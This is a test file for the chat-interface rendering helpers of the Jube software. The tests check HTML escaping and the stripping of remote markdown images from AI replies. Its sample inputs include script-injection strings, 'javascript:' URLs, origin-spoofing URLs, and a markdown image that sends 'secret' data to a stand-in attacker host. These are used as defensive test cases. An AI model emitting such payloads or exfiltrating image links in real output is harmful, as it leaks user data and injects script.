/* Copyright (C) 2022-present Jube Holdings Limited.
 *
 * This file is part of Jube™ software.
 *
 * Jube™ is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License
 * as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
 * Jube™ is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty
 * of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License for more details.

 * You should have received a copy of the GNU Affero General Public License along with Jube™. If not,
 * see <https://www.gnu.org/licenses/>.
 */

import {describe, expect, it} from 'vitest'
import {
  activityHtml,
  attachmentsHtml,
  extractSvgBlocks,
  metaHtml,
  neutraliseMarkdownImages,
  svgDiagramHtml,
  unwrapMarkdownBlocks,
  withoutSvgBlocks,
} from '../render'

describe('activityHtml', () => {
  it('escapes the text and the detail', () => {
    const html = activityHtml('Step', '<b>x</b>', '<script>alert(1)</script>', null, null)

    expect(html).not.toContain('<script>')
    expect(html).not.toContain('<b>')
    expect(html).toContain('&lt;script&gt;')
  })

  it('is a disclosure only when there is detail', () => {
    expect(activityHtml('Step', 'a', 'b', null, null)).toContain('<details')
    expect(activityHtml('Step', 'a', null, null, null)).not.toContain('<details')
  })

  it('draws the tool icon when one is known', () => {
    expect(activityHtml('Step', 'a', null, 3, null)).toContain('jooby-tool-icon')
    expect(activityHtml('Step', 'a', null, 99999, null)).not.toContain('jooby-tool-icon')
  })
})

describe('activityHtml agent banners', () => {
  it('gives each boundary kind its own class and glyph', () => {
    expect(activityHtml('Delegation', 'Launching Zubr', null, null, null)).toContain(
      'jooby-banner-avatar',
    )

    for (const kind of ['Handoff', 'Validation', 'Revision', 'Guard'] as const) {
      const html = activityHtml(kind, 'x', null, null, null)

      expect(html).toContain(`jooby-activity-${kind.toLowerCase()}`)
      expect(html).toContain('jooby-banner-glyph')
    }
  })

  it('shows Jadek the same way whether it is checking or asking for a revision', () => {
    const glyphOf = (html: string) => html.match(/<svg class="jooby-banner-glyph".*?<\/svg>/)?.[0]

    expect(glyphOf(activityHtml('Validation', 'x', null, null, null))).toBe(
      glyphOf(activityHtml('Revision', 'x', null, null, null)),
    )
  })

  it('leaves an ordinary step with its tool icon and no banner glyph', () => {
    expect(activityHtml('Step', 'x', null, 3, null)).not.toContain('jooby-banner-glyph')
  })
})

describe('metaHtml pills', () => {
  it('puts the time and each statistic in its own pill', () => {
    const html = metaHtml({
      timestamp: '2026-10-20T10:00:00Z',
      stats: {inputTokens: 5, outputTokens: 7, durationMs: 1500},
    })

    expect(html.match(/class="jooby-pill"/g)).toHaveLength(4)
    expect(html).toContain('>↑5<')
    expect(html).toContain('>1.5s<')
  })
})

describe('metaHtml', () => {
  it('offers feedback only for a message that can have it', () => {
    expect(metaHtml({messageId: 7})).toContain('data-message-id="7"')
    expect(metaHtml({messageId: null})).not.toContain('jooby-feedback')
  })

  it('locks both buttons once an answer is chosen', () => {
    const html = metaHtml({messageId: 7, chosen: true})

    expect(html.match(/ disabled/g)).toHaveLength(2)
    expect(html).toContain('jooby-feedback-chosen')
  })
})

describe('attachmentsHtml', () => {
  it('escapes names and links to the file endpoint', () => {
    const html = attachmentsHtml([{id: 4, name: '"><x>.csv'}], (id) => `/files/${id}`)

    expect(html).toContain('href="/files/4"')
    expect(html).not.toContain('"><x>')
  })
})

describe('svgDiagramHtml', () => {
  it('embeds only a whole svg document as an image', () => {
    expect(svgDiagramHtml('d', '<svg viewBox="0 0 1 1"></svg>')).toContain('data:image/svg+xml')
    expect(svgDiagramHtml('d', '<div><svg></svg></div>')).toBeUndefined()
    expect(svgDiagramHtml('d', '<svg>')).toBeUndefined()
  })
})

describe('neutraliseMarkdownImages', () => {
  it('removes inline remote images so a reply cannot make the browser call out', () => {
    const out = neutraliseMarkdownImages('see ![chart](https://evil.example/p.png?d=secret) now')

    expect(out).not.toContain('evil.example')
    expect(out).toContain('[image removed: chart]')
  })

  it('removes reference style, empty alt and data uri images', () => {
    expect(neutraliseMarkdownImages('![a][r]\n\n[r]: https://evil.example/x')).toContain(
      '[image removed: a]',
    )
    expect(neutraliseMarkdownImages('![](http://evil.example/x)')).toBe('[image removed]')
    expect(neutraliseMarkdownImages('![x](data:image/svg+xml;base64,AAAA)')).not.toContain('data:')
  })

  it('keeps images served from this same origin', () => {
    const origin = 'https://jube.example'

    expect(neutraliseMarkdownImages('![c](/api/AskJooby/1/Files/2)', origin)).toBe(
      '![c](/api/AskJooby/1/Files/2)',
    )
    expect(neutraliseMarkdownImages('![c](https://jube.example/images/a.png "t")', origin)).toBe(
      '![c](https://jube.example/images/a.png "t")',
    )
  })

  it('still removes anything that only looks same origin', () => {
    const origin = 'https://jube.example'

    for (const url of [
      '//evil.example/x.png',
      '/\\evil.example/x.png',
      'https://jube.example.evil.example/x.png',
      'https://jube.example@evil.example/x.png',
      'http://jube.example/x.png',
      'javascript:alert',
      'data:image/svg+xml;base64,AAAA',
    ]) {
      expect(neutraliseMarkdownImages(`![x](${url})`, origin)).toBe('[image removed: x]')
    }

    expect(neutraliseMarkdownImages('![x][r]', origin)).toBe('[image removed: x]')
  })

  it('leaves ordinary links and text alone', () => {
    const text = 'a [link](https://example.com) and 1 < 2'

    expect(neutraliseMarkdownImages(text)).toBe(text)
  })
})

describe('svg code blocks', () => {
  const reply = 'Here:\n\n```svg\n<svg viewBox="0 0 1 1"></svg>\n```\n\nDone.'

  it('extracts every complete svg block', () => {
    expect(extractSvgBlocks(reply)).toEqual(['<svg viewBox="0 0 1 1"></svg>'])
    expect(extractSvgBlocks('```svg\n<svg></svg>\n```\n```svg\n<svg/>\n```')).toHaveLength(2)
  })

  it('removes complete blocks from the prose and leaves other fences alone', () => {
    expect(withoutSvgBlocks(reply)).not.toContain('<svg')
    expect(withoutSvgBlocks(reply)).toContain('Done.')
    expect(withoutSvgBlocks('```sql\nselect 1\n```')).toContain('select 1')
  })

  it('hides a block that is still streaming', () => {
    expect(withoutSvgBlocks('Here:\n```svg\n<svg viewBox="0')).toBe('Here:')
    expect(extractSvgBlocks('Here:\n```svg\n<svg viewBox="0')).toEqual([])
  })
})

describe('unwrapMarkdownBlocks', () => {
  it('unwraps a complete markdown fence so the inner markdown renders', () => {
    expect(unwrapMarkdownBlocks('a\n```markdown\n# Title\n- [ ] x\n```\nb')).toBe(
      'a\n# Title\n- [ ] x\nb',
    )
    expect(unwrapMarkdownBlocks('```md\n**hi**\n```')).toBe('**hi**')
  })

  it('keeps a longer fence whole so nested code survives', () => {
    const text = '````markdown\n```sql\nselect 1\n```\n````'

    expect(unwrapMarkdownBlocks(text)).toBe('```sql\nselect 1\n```')
  })

  it('drops the opening fence while the block is still streaming and leaves other fences', () => {
    expect(unwrapMarkdownBlocks('x\n```markdown\n# Ti')).toBe('x\n# Ti')
    expect(unwrapMarkdownBlocks('```sql\nselect 1\n```')).toBe('```sql\nselect 1\n```')
  })
})
